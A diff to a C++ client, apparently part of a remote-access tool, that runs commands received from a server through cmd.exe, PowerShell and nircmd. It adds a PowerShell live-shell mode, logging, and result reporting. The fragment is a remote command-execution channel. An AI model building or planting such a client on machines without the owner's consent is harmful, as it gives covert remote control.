@@ -34,32 +34,41 @@ void client::data_parser(string type, int size, string data)
 			<< "TEXT: " << data << endl;
 	}
 	else if (type == "ALIV") {
-		cout << endl << "isAlive() -> Send(\"OK\")" << endl;
+		cout << endl << "isAlive() -> return true;" << endl;
 		send_data("OK", "ALIV");
 	}
 	else if (type == "CMDO") { // execute only CMD(O)nce
 		cmd_init(CommandPrompt, false);
 		read_and_send();
 		command(data);
+		cout << "cmd.exe: \"" << data << "\"" << endl;
 	}
 	else if (type == "POSO") {
 		cmd_init(PowerShell, false);
 		command(data);
+		cout << "powershell.exe: \"" << data << "\"" << endl;
 	}
 	else if (type == "NIRO") {
 		cmd_init(NirCmd);
 		bool output;
 		nircmd(data, output);
 		send_data((output) ? "True" : "False", "NIRB");
+		cout << "nircmd.dll: \"" << data << "\"" << endl;
 	}
-	else if (type == "CMDS") { // command prompt shell interactive START
-		cmd_init(CommandPrompt, false);
-		read_and_send();
+	else if (type == "CMDS" || type == "PSSS") { // shell interactive START
+		if (type == "CMDS") {
+			cmd_init(CommandPrompt, false);
+			read_and_send();
+		}
+		else if (type == "PSSS") {
+			cmd_init(PowerShell, false);
+			read_and_send();
+		}
 		while (true) {
 			string type, data;
 			recv_data(type, data);
 			if (type == "CMDC" && active) {
-				cout << "exec:" << data << endl;
+				cout << ((active_prompt == CommandPrompt) ? "cmd.exe" : "powershell.exe") << " live shell command: \"" << data << "\"" << endl;
 				command(data);
 			}
 			else {
@@ -615,6 +624,7 @@ void client::command(string command)
 	if (nircmd_presence(command)) {
 		bool output;
 		nircmd(command.substr(7), output); // use 7 to include parser space
+		send_data((output) ? "true" : "false", "CMDE");
 	}
 	else
 		if (command == "exit") { //use !exit to call internal exit
